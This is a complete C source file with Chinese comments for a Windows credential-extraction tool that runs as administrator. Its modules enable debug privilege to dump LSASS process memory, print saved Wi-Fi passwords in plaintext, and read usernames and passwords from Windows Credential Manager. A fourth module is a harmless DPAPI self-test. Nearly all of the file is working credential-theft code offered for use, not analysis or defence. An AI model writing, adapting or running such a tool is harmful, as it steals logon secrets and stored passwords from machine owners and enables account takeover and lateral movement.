// 文件：laztool.c
// 编译：x64 Native Tools Command Prompt -> cl /O2 /MT /Fe:LazTool.exe laztool.c /link wlanapi.lib dbghelp.lib credui.lib
// 运行：必须以管理员身份运行

#include <windows.h>
#include <wlanapi.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#include <wincred.h>
#include <shlwapi.h>

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "credui.lib")
#pragma comment(lib, "shlwapi.lib")

BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation = {0};
        DWORD dwSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, dwSize, &dwSize))
            fRet = Elevation.TokenIsElevated;
        CloseHandle(hToken);
    }
    return fRet;
}

BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return TRUE;
}

DWORD GetProcessPid(const wchar_t* procName) {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(snapshot, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, procName) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &pe));
        }
        CloseHandle(snapshot);
    }
    return pid;
}

void DumpLsass() {
    wprintf(L"\n[+] ===== 模块1: LSASS 内存转储 =====\n");
    if (!EnableDebugPrivilege()) {
        wprintf(L"[-] 启用 SeDebugPrivilege 失败，请以管理员身份运行。\n");
        return;
    }
    DWORD pid = GetProcessPid(L"lsass.exe");
    if (pid == 0) {
        wprintf(L"[-] 未找到 lsass.exe 进程。\n");
        return;
    }
    wprintf(L"[*] 找到 LSASS PID: %lu\n", pid);
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION, FALSE, pid);
    if (!hProcess) {
        wprintf(L"[-] 打开进程失败，错误码: %lu\n", GetLastError());
        return;
    }
    wchar_t dumpPath[MAX_PATH];
    GetTempPathW(MAX_PATH, dumpPath);
    wcscat_s(dumpPath, MAX_PATH, L"lsass.dmp");
    HANDLE hFile = CreateFileW(dumpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] 创建转储文件失败，错误码: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }
    BOOL success = MiniDumpWriteDump(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (success) {
        wprintf(L"[+] LSASS 转储成功 -> %ls\n", dumpPath);
    } else {
        DWORD err = GetLastError();
        wprintf(L"[-] MiniDumpWriteDump 失败，错误码: 0x%08X (%lu)\n", err, err);
    }
    CloseHandle(hFile);
    CloseHandle(hProcess);
}

void DumpWifiPasswords() {
    wprintf(L"\n[+] ===== 模块2: Wi-Fi 明文密码 =====\n");
    HANDLE hClient = NULL;
    DWORD dwCurVersion = 0;
    if (WlanOpenHandle(2, NULL, &dwCurVersion, &hClient) != ERROR_SUCCESS) {
        wprintf(L"[-] WlanOpenHandle 失败，请检查 WLAN AutoConfig 服务。\n");
        return;
    }
    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    if (WlanEnumInterfaces(hClient, NULL, &pIfList) != ERROR_SUCCESS) {
        wprintf(L"[-] 未找到无线网卡。\n");
        WlanCloseHandle(hClient, NULL);
        return;
    }
    int found = 0;
    for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
        PWLAN_PROFILE_INFO_LIST pProfileList = NULL;
        if (WlanGetProfileList(hClient, &pIfList->InterfaceInfo[i].InterfaceGuid, NULL, &pProfileList) == ERROR_SUCCESS) {
            for (DWORD j = 0; j < pProfileList->dwNumberOfItems; j++) {
                WLAN_PROFILE_INFO profile = pProfileList->ProfileInfo[j];
                DWORD flags = WLAN_PROFILE_GET_PLAINTEXT;
                DWORD granted = 0;
                LPWSTR xml = NULL;
                if (WlanGetProfile(hClient, &pIfList->InterfaceInfo[i].InterfaceGuid, profile.strProfileName, NULL, &xml, &flags, &granted) == ERROR_SUCCESS) {
                    wchar_t* keyStart = wcsstr(xml, L"<keyMaterial>");
                    if (keyStart) {
                        keyStart += wcslen(L"<keyMaterial>");
                        while (*keyStart && iswspace(*keyStart)) keyStart++;
                        wchar_t* keyEnd = wcsstr(keyStart, L"</keyMaterial>");
                        if (keyEnd) {
                            while (keyEnd > keyStart && iswspace(*(keyEnd-1))) keyEnd--;
                            wchar_t saved = *keyEnd;
                            *keyEnd = L'\0';
                            wprintf(L"[+] SSID: %-20ls -> 密码: %ls\n", profile.strProfileName, keyStart);
                            *keyEnd = saved;
                            found++;
                        } else {
                            wprintf(L"[?] SSID: %-20ls -> 有<keyMaterial>但无结束标签\n", profile.strProfileName);
                        }
                    } else {
                        wprintf(L"[i] SSID: %-20ls -> 无密码（开放网络或企业认证）\n", profile.strProfileName);
                    }
                    WlanFreeMemory(xml);
                }
            }
            WlanFreeMemory(pProfileList);
        }
    }
    WlanFreeMemory(pIfList);
    WlanCloseHandle(hClient, NULL);
    if (found == 0) wprintf(L"[-] 未找到任何保存明文密码的 Wi-Fi。\n");
}

void DumpCredentialManager() {
    wprintf(L"\n[+] ===== 模块3: 凭据管理器 =====\n");
    PCREDENTIALW *creds = NULL;
    DWORD count = 0;
    if (!CredEnumerateW(NULL, 0, &count, &creds)) {
        wprintf(L"[-] CredEnumerate 失败，错误码: %lu\n", GetLastError());
        return;
    }
    int found = 0;
    for (DWORD i = 0; i < count; i++) {
        PCREDENTIALW cred = creds[i];
        wprintf(L"\n目标: %ls\n", cred->TargetName ? cred->TargetName : L"(null)");
        wprintf(L"用户名: %ls\n", cred->UserName ? cred->UserName : L"(空)");
        if (cred->CredentialBlobSize && cred->CredentialBlob) {
            BYTE* blob = cred->CredentialBlob;
            DWORD size = cred->CredentialBlobSize;
            // 尝试宽字符
            if (size % 2 == 0 && size >= 2) {
                wchar_t* w = (wchar_t*)blob;
                int wlen = size / 2;
                if (w[wlen-1] == 0) wlen--;
                BOOL ok = TRUE;
                for (int k = 0; k < wlen; k++) if (w[k] < 0x20 && w[k] != 0) { ok = FALSE; break; }
                if (ok && wlen > 0) {
                    wprintf(L"密码: %.*ls\n", wlen, w);
                    found++;
                    continue;
                }
            }
            // 尝试 ANSI
            char* a = (char*)blob;
            BOOL ok = TRUE;
            for (DWORD k = 0; k < size; k++) if (a[k] < 0x20 && a[k] != 0) { ok = FALSE; break; }
            if (ok && size > 0) {
                printf("密码: %.*s\n", size, a);
                found++;
                continue;
            }
            // 二进制显示
            wprintf(L"密码(hex): ");
            for (DWORD k = 0; k < min(size, 64); k++) wprintf(L"%02X ", blob[k]);
            wprintf(L"\n");
            found++;
        } else {
            wprintf(L"密码: (空)\n");
        }
    }
    CredFree(creds);
    if (found == 0) wprintf(L"[-] 未提取到任何含密码的凭据。\n");
}

void DemonstrateDPAPI() {
    wprintf(L"\n[+] ===== 模块4: DPAPI 测试 =====\n");
    wchar_t testData[128] = L"DPAPI_Test_String_For_CurrentUser";
    DATA_BLOB in = { (BYTE*)testData, (DWORD)(wcslen(testData)+1)*sizeof(wchar_t) };
    DATA_BLOB encrypted = {0}, decrypted = {0};
    if (!CryptProtectData(&in, L"Test", NULL, NULL, NULL, 0, &encrypted)) {
        wprintf(L"[-] CryptProtectData 失败，错误码: %lu\n", GetLastError());
        return;
    }
    wprintf(L"[*] 加密成功，大小: %lu 字节\n", encrypted.cbData);
    if (!CryptUnprotectData(&encrypted, NULL, NULL, NULL, NULL, 0, &decrypted)) {
        wprintf(L"[-] CryptUnprotectData 失败，错误码: %lu\n", GetLastError());
        LocalFree(encrypted.pbData);
        return;
    }
    wprintf(L"[+] 解密成功: %ls\n", (wchar_t*)decrypted.pbData);
    LocalFree(encrypted.pbData);
    LocalFree(decrypted.pbData);
}

int main() {
    SetConsoleOutputCP(CP_UTF8);
    wprintf(L"=========================================================\n");
    wprintf(L"     Windows 凭据提取工具 v3.0 (管理员运行)             \n");
    wprintf(L"=========================================================\n");
    if (!IsElevated()) {
        wprintf(L"\n[-] 请以管理员身份运行此程序。\n");
        wprintf(L"    右键 -> 以管理员身份运行。\n");
        getwchar();
        return 1;
    }
    wprintf(L"[+] 管理员权限已确认\n");
    DumpLsass();
    DumpWifiPasswords();
    DumpCredentialManager();
    DemonstrateDPAPI();
    wprintf(L"\n[*] 执行完毕。\n");
    return 0;
}
